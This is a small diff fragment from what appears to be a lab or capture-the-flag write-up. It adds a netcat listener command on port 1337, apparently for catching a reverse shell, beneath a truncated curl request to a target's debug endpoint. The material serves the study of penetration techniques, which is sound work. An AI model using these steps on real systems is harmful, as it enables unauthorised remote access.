@@ -730,5 +730,12 @@ curl -X POST --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Debug' --data "co
 First ill install a release from github then trnasfer it to the server
 
 ```python
+nc -lnvp 1337                                                                              
+listening on [any] 1337 ...
+```
+
+Then start a listener
+
+```python
 
 ```
